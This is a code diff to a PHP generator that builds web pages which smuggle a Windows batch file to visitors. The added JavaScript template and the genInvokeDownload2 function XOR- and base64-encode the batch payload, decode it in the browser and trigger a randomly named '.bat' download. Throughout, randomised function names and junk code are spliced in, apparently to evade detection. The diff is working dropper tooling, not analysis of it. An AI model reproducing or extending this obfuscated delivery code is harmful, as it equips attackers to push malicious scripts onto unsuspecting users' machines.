@@ -53,6 +53,18 @@ download/*__random_function__*/(__fr__,__tr__)/*__random_function__*/;
 /*__random_code__*/
 ';
 
+$generateInvokeStr2 = '
+/*__random_function__*/
+/*__random_code__*/
+var __fr__ = "__nr__.bat";/*__random_function__*/
+/*__random_code__*/
+__decodebatch__
+/*__random_function__*/
+/*__random_code__*/
+download/*__random_function__*/(__fr__,__tr__)/*__random_function__*/;
+/*__random_code__*/
+';
+
 function generateRandomString() {
     $rand1 = rand(5,20);
     $characters = 'abcdefghijklmnopqrstuvwxyz';
@@ -236,7 +248,7 @@ function generateDecodeBatString($base64Bat){
       $ret = $ret . join("",$b);
     }
   }
-  return $ret;
+  return str_replace('\\"','"',str_replace("\\r\\n","\r\n",$ret));
 }
 function generateDecodeBat($base64Bat,$lastVariable){
   $ret = "";
@@ -454,6 +466,50 @@ function generateBatFile2($batFile,$binaryContent,$execCommand,$extension){
   return $file;
 }
 
+
+function genInvokeDownload2($bat){
+  global $generateInvokeStr2;
+  $fr = generateRandomString();
+  $tr = generateRandomString();
+  $nr = generateRandomString();
+
+  $ret = $generateInvokeStr2;
+  $ret = str_replace("__fr__", $fr, $ret);
+  $ret = str_replace("__tr__", $tr, $ret);
+  $ret = str_replace("__nr__", $tr, $ret);
+
+  $batText = generateDecodeBatString($bat);
+  list($r,$x) = generateXorParts(base64_encode($batText),false);
+  $decodeBatch = 'var __tr__ = (
+    function(__var1__,__var2__){
+      var __var3__ = "";
+      for(var i=0;i<__var1__.length;i++){
+        __var3__ = __var3__ + String.fromCharCode(__var1__.charCodeAt(i) ^ __var2__.charCodeAt(i));
+      }
+      return atob(__var3__);
+    }
+    )(atob("__param1__"),atob("__param2__"));';
+  $decodeBatch = str_replace("__var1__",generateRandomString(),$decodeBatch);
+  $decodeBatch = str_replace("__var2__",generateRandomString(),$decodeBatch);
+  $decodeBatch = str_replace("__var3__",generateRandomString(),$decodeBatch);
+  $decodeBatch = str_replace("__tr__",$tr,$decodeBatch);
+  $decodeBatch = str_replace("__param1__",$r,$decodeBatch);
+  $decodeBatch = str_replace("__param2__",$x,$decodeBatch);
+
+  $ret = str_replace("__decodebatch__", $decodeBatch, $ret);
+  preg_match_all("/".preg_quote("/*__","/")."([a-zA-Z_]+)".preg_quote("__*/","/")."/", $ret, $match);
+  for($i=0;$i<count($match[0]);$i++){
+    $replacement = "";
+    if ($match[1][$i] == "random_function"){
+      $replacement = randomFunction();
+    } else if ($match[1][$i] == "random_code"){
+      $replacement = randomScriptCode(5);
+    }
+    $ret = preg_replace("/".preg_quote($match[0][$i],"/")."/",$replacement, $ret, 1);
+  }
+
+  return $ret;
+}
 function generatePage2($html,$bat){
   preg_match_all('/<!--__(.+)__-->/', $html, $match);
   for($i=0;$i<count($match[0]);$i++){
